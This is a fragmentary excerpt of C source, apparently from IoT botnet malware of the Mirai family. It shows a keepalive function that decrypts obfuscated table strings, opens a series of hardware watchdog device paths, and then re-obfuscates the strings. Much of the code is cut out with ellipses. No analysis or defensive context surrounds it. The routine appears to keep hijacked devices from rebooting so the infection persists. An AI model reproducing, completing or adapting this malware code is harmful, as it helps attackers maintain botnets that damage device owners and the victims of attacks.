...
#define SINGLE_INSTANCE_PORT 59025
...
void ioctl_keepalive(void)
{
    ...
    table_unlock_val(TABLE_MISC_WATCHDOG_5);
    table_unlock_val(TABLE_MISC_WATCHDOG_6);
    table_unlock_val(TABLE_MISC_WATCHDOG_7);
    table_unlock_val(TABLE_MISC_WATCHDOG_8);
    table_unlock_val(TABLE_MISC_WATCHDOG_9);
    ...
    if((ioctl_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG_1, NULL), 2)) != -1 ||
       ...
       (ioctl_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG_4, NULL), 2)) != -1 ||
       (ioctl_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG_5, NULL), 2)) != -1 ||
       (ioctl_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG_6, NULL), 2)) != -1 ||
       (ioctl_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG_7, NULL), 2)) != -1 ||
       (ioctl_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG_8, NULL), 2)) != -1 ||
       (ioctl_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG_9, NULL), 2)) != -1)
    {
        #ifdef DEBUG
    ...
    table_lock_val(TABLE_MISC_WATCHDOG_5);
    table_lock_val(TABLE_MISC_WATCHDOG_6);
    table_lock_val(TABLE_MISC_WATCHDOG_7);
    table_lock_val(TABLE_MISC_WATCHDOG_8);
    table_lock_val(TABLE_MISC_WATCHDOG_9);
